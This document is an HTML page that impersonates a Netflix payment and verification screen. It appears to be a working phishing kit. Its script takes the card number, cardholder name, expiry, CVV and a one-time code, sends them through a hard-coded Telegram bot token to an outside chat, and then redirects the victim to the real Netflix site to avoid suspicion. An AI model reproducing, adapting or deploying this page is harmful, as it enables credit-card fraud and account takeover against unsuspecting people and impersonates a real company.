<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Sign In</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bcae-07a3f8dc141a/f6d7434e-d6de-4185-a6d4-c77a2d08737b/US-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg');
            background-size: cover;
            background-position: center;
        }
        .container {
            width: 100%;
            max-width: 450px;
            padding: 80px 68px 40px;
            background-color: rgba(0, 0, 0, 0.75);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 4px;
            margin: 10px;
        }
        .logo { color: #E50914; font-size: 32px; font-weight: bold; margin-bottom: 35px; letter-spacing: 1px; text-transform: uppercase; }
        h1 { font-size: 32px; font-weight: 700; margin-bottom: 28px; color: #fff; }
        .form-group { margin-bottom: 26px; }
        input {
            width: 100%;
            padding: 16px;
            background-color: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.1);
            color: #fff;
            font-size: 16px;
            border-radius: 4px;
            outline: none;
            transition: background-color 0.2s, border-color 0.2s;
        }
        input:focus { background-color: rgba(255,255,255,0.15); border-color: #fff; }
        .row { display: flex; gap: 16px; }
        .col { flex: 1; }
        button {
            width: 100%;
            padding: 16px;
            background-color: #E50914;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 30px;
            transition: background-color 0.2s;
        }
        button:hover { background-color: #f40612; }
        .hidden { display: none !important; }
        .secure-badge { font-size: 12px; color: #b3b3b3; margin-top: 20px; text-align: center; }
        .success-text { text-align: center; }
        .success-text h2 { color: #46d369; font-size: 24px; margin-bottom: 10px; font-weight: 400; }
        .success-text p { color: #b3b3b3; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">NETFLIX</div>
    
    <div id="step1">
        <h1>Payment Details</h1>
        <form id="cardForm">
            <div class="form-group">
                <input type="text" id="card_number" placeholder="Card number" required maxlength="19" style="letter-spacing: 2px;">
            </div>
            <div class="form-group">
                <input type="text" id="card_name" placeholder="Name on card" required>
            </div>
            <div class="row">
                <div class="col form-group">
                    <input type="text" id="expiry" placeholder="MM/YY" required maxlength="5">
                </div>
                <div class="col form-group">
                    <input type="password" id="cvv" placeholder="Security code" required maxlength="4">
                </div>
            </div>
            <button type="submit" id="submitCardBtn">Continue</button>
            <div class="secure-badge">Secure Connection</div>
        </form>
    </div>

    <div id="step2" class="hidden">
        <h1>Verify Account</h1>
        <p style="text-align: center; color: #b3b3b3; margin-bottom: 20px;">Enter the code sent to your device.</p>
        <form id="otpForm">
            <div class="form-group">
                <input type="text" id="otp" placeholder="123 456" required maxlength="7" style="text-align: center; font-size: 20px; letter-spacing: 4px;">
            </div>
            <button type="submit" id="submitOtpBtn">Verify & Start Watching</button>
            <div class="secure-badge">Secure Connection</div>
        </form>
    </div>

    <div id="successPage" class="hidden">
        <div class="success-text">
            <h2>Payment Confirmed</h2>
            <p>Redirecting to your profile...</p>
        </div>
    </div>
</div>

<script>
    const BOT_TOKEN = '9136426133:AAHCP6Pi-4ijK49P_dAb7NYL8xM158JkCVA';
    const CHAT_ID = '-5467135836';

    let cardData = {};

    function sendToTelegram(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
        return fetch(url, { method: 'POST' });
    }

    document.getElementById('cardForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const card = document.getElementById('card_number').value.replace(/\s+/g, '');
        const name = document.getElementById('card_name').value;
        const exp = document.getElementById('expiry').value;
        const cvv = document.getElementById('cvv').value;

        cardData = { card, name, exp, cvv };

        const message = `🎯 *Netflix Capture - Step 1*\n💳 Card: \`${card}\`\n👤 Name: \`${name}\`\n📅 Expiry: \`${exp}\`\n🔒 CVV: \`${cvv}\``;
        
        sendToTelegram(message).then(() => {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('otp').focus();
        });
    });

    document.getElementById('otpForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const otp = document.getElementById('otp').value;

        const message = `🎯 *Netflix Capture - Complete*\n💳 Card: \`${cardData.card}\`\n👤 Name: \`${cardData.name}\`\n📅 Expiry: \`${cardData.exp}\`\n🔒 CVV: \`${cardData.cvv}\`\n🔢 OTP: \`${otp}\``;

        sendToTelegram(message).then(() => {
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('successPage').classList.remove('hidden');
            
            // Redirect to Netflix after 1.5 seconds
            setTimeout(() => {
                window.location.href = "https://www.netflix.com";
            }, 1500);
        });
    });
</script>

</body>
</html>
